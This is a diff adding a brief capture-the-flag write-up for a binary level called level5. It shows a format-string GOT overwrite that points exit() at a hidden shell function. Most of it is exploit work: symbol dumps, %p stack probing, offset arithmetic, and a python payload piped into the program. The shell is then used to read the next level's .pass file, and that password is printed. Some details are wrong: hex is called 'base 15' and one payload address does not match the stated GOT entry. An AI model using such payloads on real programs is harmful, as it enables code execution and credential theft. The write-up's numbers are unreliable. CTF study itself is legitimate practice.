@@ -1,0 +1,79 @@
+As in the previous level, the program flaw remains the same
+
+But this time there is no condition that launches a shell or a cat
+We cannot do as before, because the payload is protected and is limited
+
+However there is a function o, which launches a shell.
+But the function is never called, in the program.
+We need to take a new approach: GOT Overwrite.
+
+
+objdump -R ./level5 
+
+./level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+
+08049838 -> Adress of exit
+
+objdump -t ./level5 | grep o
+./level5:     file format elf32-i386
+08048148 l    d  .note.ABI-tag	00000000              .note.ABI-tag
+08048168 l    d  .note.gnu.build-id	00000000              .note.gnu.build-id
+080482b6 l    d  .gnu.version	00000000              .gnu.version
+080482cc l    d  .gnu.version_r	00000000              .gnu.version_r
+080485e8 l    d  .rodata	00000000              .rodata
+08049738 l    d  .ctors	00000000              .ctors
+08049740 l    d  .dtors	00000000              .dtors
+08049814 l    d  .got	00000000              .got
+08049818 l    d  .got.plt	00000000              .got.plt
+00000000 l    d  .comment	00000000              .comment
+08049738 l     O .ctors	00000000              __CTOR_LIST__
+08049740 l     O .dtors	00000000              __DTOR_LIST__
+08048420 l     F .text	00000000              __do_global_dtors_aux
+0804984c l     O .bss	00000001              completed.6159
+08049850 l     O .bss	00000004              dtor_idx.6161
+0804973c l     O .ctors	00000000              __CTOR_END__
+080485a0 l     F .text	00000000              __do_global_ctors_aux
+08049738 l       .ctors	00000000              __init_array_end
+08049738 l       .ctors	00000000              __init_array_start
+08049818 l     O .got.plt	00000000              _GLOBAL_OFFSET_TABLE_
+08049744 g     O .dtors	00000000              .hidden __DTOR_END__
+00000000  w      *UND*	00000000              __gmon_start__
+08049844 g     O .data	00000000              .hidden __dso_handle
+080485ec g     O .rodata	00000004              _IO_stdin_used
+080485e8 g     O .rodata	00000004              _fp_hw
+080484a4 g     F .text	0000001e              o
+
+
+080484a4 -> Address of o 
+
+./level5 
+ AAA %p %p %p %p
+
+./level5 
+ AAA %p %p %p %p
+ AAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414120
+
+0804(base 15) -> 2052 (base 10) 2052 - 8 = 2044	
+84a4(base 15) -> 33956 (base 10) 33956 - 2052 = 31904
+ 
+
+(python -c 'print "\xae\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"' ; cat) | ./level5
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+
+
+Helpfull :
+https://axcheron.github.io/exploit-101-format-strings/
